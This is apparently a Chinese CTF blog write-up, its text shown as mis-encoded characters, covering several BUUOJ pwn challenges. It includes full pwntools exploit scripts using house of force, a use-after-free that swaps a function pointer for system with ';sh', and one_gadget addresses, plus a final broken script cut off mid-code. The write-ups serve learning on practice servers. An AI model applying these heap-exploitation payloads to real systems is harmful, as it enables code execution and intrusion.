<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25575</span>)<br>shell = <span class="hljs-number">0x08049284</span><br>input_addr = <span class="hljs-number">0x0811EB40</span><br>p.recvuntil(<span class="hljs-string">&quot;Authenticate : &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(shell) + p32(input_addr)<br>p.sendline(payload.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="äºŒã€gyctf-2020-force"><a href="#äºŒã€gyctf-2020-force" class="headerlink" title="äºŒã€gyctf_2020_force"></a>äºŒã€gyctf_2020_force</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916151101226.png" alt="image-20210916151101226"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153042695.png" alt="image-20210916153042695"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153101689.png" alt="image-20210916153101689"></p>
<p>è¿›å…¥IDAï¼Œæ€»å…±å°±ä¸¤ä¸ªåŠŸèƒ½ï¼šä¸€ä¸ªæ˜¯ç”³è¯·å †å—ï¼Œå †å—å¤§å°æ— é™åˆ¶ï¼Œå¹¶ä¸”èƒ½è¿”å›ç»™å †åœ°å€ï¼Œç„¶åå¡«å…¥å†…å®¹æ˜¯å›ºå®šé•¿åº¦0x50ï¼›å¦å¤–ä¸€ä¸ªputsåŠŸèƒ½ã€‚ã€‚ã€‚å±ç”¨æ²¡æœ‰ï¼æ ¹æ®é¢˜ç›®æç¤ºæƒ³åˆ°house of force</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163309864.png" alt="image-20210916163309864"></p>
<p>å› ä¸ºç¨‹åºä¼šè¿”å›å †çš„åœ°å€ï¼Œç¨‹åºåˆä¸é™åˆ¶å †å—çš„å¤§å°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„å †å—ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šè°ƒç”¨mmapè¿›è¡Œåˆ†é…å †å—ï¼Œæ­¤æ—¶å †å—çš„åœ°å€ä¼šæ˜¯libcä¸­çš„ä¸€ä¸ªåœ°å€</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163532720.png" alt="image-20210916163532720"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205725583.png" alt="image-20210916205725583"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205619022.png" alt="image-20210916205619022"></p>
<p>ç„¶åç”³è¯·ä¸€ä¸ªå°äº0x50çš„å †å—ï¼Œè®©å †å—èƒ½è¿›è¡Œæº¢å‡ºè¦†ç›–top chunkçš„sizeä½ï¼Œä¿®æ”¹ä¸º-1ï¼ˆä¹Ÿå°±æ˜¯0xFFFFFFFFFFFFFFFFï¼‰ï¼ŒåŒæ—¶ä¹Ÿå€Ÿç€è¿™ä¸ªå †å—èƒ½è·å–åˆ°top chunkçš„åœ°å€ã€‚ä¿®æ”¹å®Œ-1ï¼Œå› ä¸ºä½¿ç”¨mallocç”³è¯·å †å—æ—¶éªŒè¯sizeçš„ç±»å‹æ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†é…å¾ˆå¤§çš„å †å—ä¹Ÿä»ç„¶å¯ä»¥é€šè¿‡éªŒè¯ï¼Œå€Ÿæ­¤ç›´æ¥ç”³è¯·ä¸€ä¸ªè¶…å¤§å †å—ï¼Œç›´æ¥å æ»¡top chunkä¸__malloc_hookä¹‹é—´é•¿åº¦ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—å»ä¿®æ”¹hookçš„ä¸ºone_gadgetå³å¯</p>
<p>ç„¶åå‘¢ã€‚offseè‡³å°‘tå‡0x30ï¼Œå› ä¸ºæˆ‘ä»¬ç”³è¯·çš„å †å—æ˜¯æœ‰å †å¤´ï¼Œå¹¶ä¸”æ˜¯è¦è¦†ç›–ä¸¤ä¸ªhook</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201004797.png" alt="image-20210916201004797"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201128484.png" alt="image-20210916201128484"></p>
<p>æœ€åçš„è°ƒæ•´æˆ‘æœ‰äº›ç†è§£ä¸äº†ï¼Œæ˜æ˜æŒ‡å‘ä¸æ˜¯0ï¼Œä½†æœ€åå´èƒ½getshellï¼Œåªèƒ½è¯´æ˜åº”è¯¥æ˜¯åœ¨æœ€åæ‰§è¡Œå®Œmallocåï¼Œrspåˆè¢«è°ƒæ•´äº†å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€pwnable-hacknote"><a href="#ä¸‰ã€pwnable-hacknote" class="headerlink" title="ä¸‰ã€pwnable_hacknote"></a>ä¸‰ã€pwnable_hacknote</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153219237.png" alt="image-20210923153219237"></p>
<p>å¸¸è§„checksecï¼Œ32ä½ï¼Œæ²¡å¼€å…¨RELROï¼ŒPIEã€‚çŒœæµ‹å¯ä»¥åŠ«æŒgotè¡¨</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153712466.png" alt="image-20210923153712466"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153919700.png" alt="image-20210923153919700"></p>
<p>åœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œï¼Œå‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿ï¼ŒæŠŠä¸€ä¸ªè°ƒç”¨putsçš„å‡½æ•°çš„åœ°å€èµ‹å€¼ç»™äº†å †å—å†…å®¹ï¼ŒçŒœæµ‹æ‰“å°åŠŸèƒ½å°±æ˜¯ç›´æ¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯•ç€ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆï¼Œæ”¹ä¸ºsystemï¼Œå†æŠŠå †å—å†…å®¹ä¿®æ”¹ä¸º/bin/sh</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153939335.png" alt="image-20210923153939335"></p>
<p>æœç„¶ï¼Œç›´æ¥è°ƒç”¨äº†å‡½æ•°æŒ‡é’ˆ</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153908205.png" alt="image-20210923153908205"></p>
<p>é‡Šæ”¾åŠŸèƒ½ï¼ŒæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œå­˜åœ¨UAF</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193256099.png" alt="image-20210923193256099"></p>
<p>ç¬¬ä¸€æ­¥æ˜¯è·å–libcï¼Œæˆ‘çš„åšæ³•æ˜¯å€Ÿç€é‡Šæ”¾unsorted chunkäº§ç”Ÿlibcï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œè¦†ç›–fdæŒ‡é’ˆä¸ºaaaaä½œä¸ºå®šä½ï¼Œç„¶åå°†bkæŒ‡é’ˆæ‰“å°å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;;sh\x00&quot;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1B37B0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193522763.png" alt="image-20210923193522763"></p>
<p>ç„¶åå°±æ˜¯ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼ŒæŠŠå‡½æ•°æŒ‡é’ˆæ”¹æˆæŒ‡å‘systemçš„ï¼Œé€šè¿‡è¿ç»­é‡Šæ”¾ä¸¤ä¸ªå †å—ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼ˆå¤§å°æ˜¯0x8çš„ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªå †å—æ˜¯ä¹‹å‰å¯ä»¥è°ƒç”¨showåŠŸèƒ½çš„å †å—ï¼Œä¿®æ”¹è¿™ä¸ªå †å—çš„å†…å®¹ä¸ºsystemåœ°å€ï¼Œä»¥åŠâ€;sh\x00â€ï¼ˆæˆ–æ˜¯â€||shâ€ï¼‰ï¼Œå› ä¸ºä¸Šå›¾ä¼ å…¥çš„å‚æ•°å…¶å®æ˜¯å‡½æ•°æŒ‡é’ˆçš„åœ°å€ï¼Œæ‰€ä»¥è¦ç”¨<code>ï¼›</code>æˆ–è€…<code>||</code>æ‰èƒ½ä¹Ÿæ‰§è¡Œåˆ°shè€Œè·å–åˆ°shellï¼Œç„¶åå€Ÿç€UAFæ‰§è¡ŒshowåŠŸèƒ½getshell</p>
<p>æœ€åï¼Œæˆ‘æ¢äº†ç½‘ä¸Šçš„åšæ³•ï¼Œæˆ‘å‰é¢ä½¿ç”¨unsorted chunkæ³„éœ²libcå¯èƒ½è¿œç¨‹æœ‰ç‚¹ä¸åŒï¼Œå¯¼è‡´æ²¡èƒ½æ‰“é€šï¼Œåªæœ‰æœ¬åœ°é€šäº†</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210924081921009.png" alt="image-20210924081921009"></p>
<p>ç„¶åæˆ‘å»å®éªŒäº†ä¸€ä¸‹ï¼Œå‘ç°è¿œç¨‹çš„åœ°å€æ¯”æœ¬åœ°çš„å¤šäº†0x300ï¼Œæˆ‘æ‰“äº†äº”å…­æ¬¡éƒ½æ˜¯å·®0x300ï¼Œä¹‹å‰åšbuuçš„å †é¢˜è·å–libcçš„æ–¹å¼ï¼Œæˆ‘å·²ç»è®°ä¸æ¸…äº†ï¼Œå› ä¸ºbuuä¸Šçš„libcæ˜¯è¢«åŠ¨è¿‡çš„libcï¼Œæ‰€ä»¥æˆ‘æœ¬åœ°æ‰“çš„æ—¶å€™åŠ è½½çš„å¹¶ä¸æ˜¯å’Œbuuä¸€æ¨¡ä¸€æ ·çš„libcï¼Œå¯èƒ½è¿™å°±æ˜¯å› ä¸ºå°ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚å§ï¼Œä¸è¿‡æ ¹æ®è¿™æ¬¡æ¥çœ‹ï¼Œç‰ˆæœ¬ä¹‹é—´çš„å°å·®å¼‚ï¼Œå¯¹ç®—libcåç§»é€ æˆçš„å½±å“åº”è¯¥æ˜¯æ¯”è¾ƒå°çš„ï¼Œå‰åå¤šè¯•å‡ ä¸ª0xn00ï¼Œè¯´ä¸å®šèƒ½è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26554</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="å››ã€ciscn-2019-final-4"><a href="#å››ã€ciscn-2019-final-4" class="headerlink" title="å››ã€ciscn_2019_final_4"></a>å››ã€ciscn_2019_final_4</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007190521092.png" alt="image-20211007190521092"></p>
<p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œæ²¡å¼€PIE</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191435082.png" alt="image-20211007191435082"></p>
<p>deleteå‡½æ•°é‡Œé¢å­˜åœ¨UAF</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191927917.png" alt="image-20211007191927917"></p>
<p>ç¦ç”¨äº†execveï¼Œæ‰€ä»¥å¾—è¦ropè¯»å–flag</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007192957739.png" alt="image-20211007192957739"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193057775.png" alt="image-20211007193057775"></p>
<p>ä¼¼ä¹æ— æ³•è°ƒè¯•è¿™é¢˜ï¼Œå»ç™¾åº¦äº†ä¸€ä¸‹<a href="https://blog.csdn.net/seaaseesa/article/details/105855306%EF%BC%8C%E5%8E%9F%E6%9D%A5%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E8%B0%83%E8%AF%95%E7%9A%84%E3%80%82%60ptrace%60">https://blog.csdn.net/seaaseesa/article/details/105855306ï¼ŒåŸæ¥å‰é¢çš„ä»£ç éƒ½æ˜¯ä¸ºäº†è®©æˆ‘ä»¬æ— æ³•è°ƒè¯•çš„ã€‚`ptrace`</a> æä¾›äº†ä¸€ç§æœºåˆ¶ä½¿å¾—çˆ¶è¿›ç¨‹å¯ä»¥è§‚å¯Ÿå’Œæ§åˆ¶å­è¿›ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹ã€‚çˆ¶è¿›ç¨‹ fork() å‡ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä¸­æ‰§è¡Œæˆ‘ä»¬æ‰€æƒ³è¦ trace çš„ç¨‹åºï¼Œåœ¨å­è¿›ç¨‹è°ƒç”¨ exec() ä¹‹å‰ï¼Œå­è¿›ç¨‹éœ€è¦å…ˆè°ƒç”¨ä¸€æ¬¡ ptraceï¼Œä»¥ PTRACE_TRACEME ä¸ºå‚æ•°ã€‚</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193646167.png" alt="image-20211007193646167"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193755639.png" alt="image-20211007193755639"></p>
<p>æ‰€ä»¥è°ƒè¯•çš„å­è¿›ç¨‹å·²ç»è¢«å ç”¨ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•å†ç”Ÿæˆä¸€ä¸ªï¼Œæ‰€ä»¥è¦è®©è¿™æ®µç¨‹åºå¤±æ•ˆï¼Œæ ¹æ®å¸ˆå‚…çš„åšæ³•æ˜¯ä¿®æ”¹æ±‡ç¼–ä»£ç ä¸º<code>jmp $+0x9E</code>ï¼Œç›´æ¥è·³è½¬åˆ°åé¢çš„å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé¿å…å ç”¨å­è¿›ç¨‹</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007194639451.png" alt="image-20211007194639451"></p>
<p>ç”¨keypatchè¿™æ ·æ”¹ä¸äº†ã€‚ã€‚ã€‚</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195234222.png" alt="image-20211007195234222"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195506179.png" alt="image-20211007195506179"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195609719.png" alt="image-20211007195609719"></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195846918.png" alt="image-20211007195846918"></p>
<p>æ‰€ä»¥æ¨¡ä»¿å¸ˆå‚…çš„åšæ³•ï¼Œä¿®æ”¹æœºå™¨ç ï¼ŒæŠŠå¯¹åº”çš„æœºå™¨ç ä¿®æ”¹ä¸ºä¸Šè¿°çš„e999000000å³å¯ï¼Œç„¶åå°±èƒ½è°ƒè¯•äº†ã€‚</p>
<p>ç„¶åè¯´ä¸‹æ€è·¯ï¼Œå¤§æ–¹å‘æ˜¯orwè¯»å–flagï¼Œç½‘ä¸Šå¸ˆå‚…çš„wpæ˜¯åˆ©ç”¨å‰é¢ç»™çš„æ ˆåœ°å€è¿›è¡Œä¼ªé€ ä¸€ä¸ªå †å¤´ï¼Œè®©åç»­çš„å †å—å¯ä»¥åˆ†é…è¿‡å»æ§åˆ¶è¿”å›åœ°å€ï¼ˆå¹¶ä¸”æ ˆåœ°å€è¿˜å¾—å…ˆè¦æ³„éœ²å‡ºæ¥ï¼‰ï¼Œä½†æ˜¯å› ä¸ºç¨‹åºæ˜¯ä¸ªæ­»å¾ªç¯ï¼Œæ‰€ä»¥è¿˜è¦åŠ«æŒé‡Œé¢çš„å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®©ç¨‹åºçœŸæ­£çš„é€€å‡ºï¼Œæ‰èƒ½å»æ‰§è¡Œå¸ƒç½®çš„ropã€‚æˆ‘è§‰å¾—æœ‰ç‚¹éº»çƒ¦äº†ï¼Œä¸å¦‚ä½¿ç”¨åŠ«æŒmalloc_hookä¸ºsetcontext + 53ï¼Œä¸ç”¨åŠ«æŒè¿™ä¹ˆå¤šçš„ã€‚</p>
<p>å¥½å§ï¼Œæˆ‘æ˜¯æ²™æ¯”ï¼Œå¿˜äº†mallocçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„sizeï¼Œå…´å†²å†²è¦è¯»flagï¼Œçœ‹åˆ°gdbé‡Œé¢rdiå€¼æ˜¯0xd0ï¼Œäººå‚»äº†ï¼Œè¿™é¢˜æœ¬æ¥çš„åšæ³•å¤ªéº»çƒ¦äº†ï¼Œæˆ‘ä¸åšäº†ï¼Œæºœäº†æºœäº†</p>
<p>é‚£å°±æ€»ç»“ä¸€ä¸‹æ€è·¯å§ï¼Œé˜²æ­¢ä»¥åæ¯”èµ›é‡åˆ°äº†ï¼Œä¹Ÿèƒ½æœ‰å°è±¡é¡ºç€åšï¼Œæ…¢æ…¢è°ƒè¯•</p>
<ul>
<li><p>é¦–å…ˆï¼Œåè°ƒè¯•ï¼Œå¯ä»¥é€‰æ‹©ä¿®æ”¹idaé‡Œé¢çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œè®©åè°ƒè¯•çš„ç¨‹åºä¸è¢«æ‰§è¡Œåˆ°ï¼Œä»è€Œå¯ä»¥è°ƒè¯•ã€‚è€Œæœºå™¨æŒ‡ä»¤å¯ä»¥ç”¨pwntoolså¾—åˆ°</p>
</li>
<li><p>å…¶æ¬¡ï¼Œå¦‚æœå¯ä»¥è¾“å…¥æ ˆçš„å†…å®¹ï¼Œåœ¨é‡Œé¢å¸ƒç½®å †å¤´ï¼Œç”±æ­¤æ¨å¹¿ï¼Œåœ¨å¯ä»¥è¾“å…¥çš„åœ°æ–¹éƒ½å¯ä»¥å¸ƒç½®å‡ºå †å¤´ï¼Œè®©æˆ‘ä»¬å¯ä»¥é€šè¿‡sizeæ£€æŸ¥ï¼Œã€‚å½“ç„¶è¿™ä»…ä»…æ˜¯2.23çš„ç‰ˆæœ¬ï¼Œä¹‹åçš„ç‰ˆæœ¬éƒ½ä¸ç”¨æ£€æŸ¥sizeçš„ã€‚å½“ç„¶å¸ƒç½®å®Œå †å¤´å°±è¦è·å¾—å †å¤´å¯¹åº”çš„åœ°å€</p>
</li>
<li><p>ç„¶åï¼Œå°±æ˜¯environå­˜ç€ä¸€ä¸ªæ ˆåœ°å€ï¼ˆè™½ç„¶æˆ‘æœ¬æ¥å°±çŸ¥é“ï¼Œå½“åšæ˜¯å¤ä¹ å§ï¼‰ã€‚å¸ƒç½®ropæ—¶é•¿åº¦ä¸å¤Ÿå†™ï¼Œå¯ä»¥å…ˆæ‰§è¡Œreadå‡½æ•°ï¼ŒåŠ é•¿å¯å†™çš„é•¿åº¦</p>
</li>
<li><p>æœ€åï¼Œå¦‚æœç¨‹åºä¸é€€å‡ºï¼Œå¯ä»¥ä¿®æ”¹æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬è®©ç¨‹åºæ‰§è¡Œåˆ°è¿”å›åœ°å€ï¼Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„rop</p>
<p>overï¼</p>
</li>
</ul>
<p>ç•™ä¸‹ä¸ªé”™è¯¯è„šæœ¬ï¼Œè·‘è·¯ï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000400B2F&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span 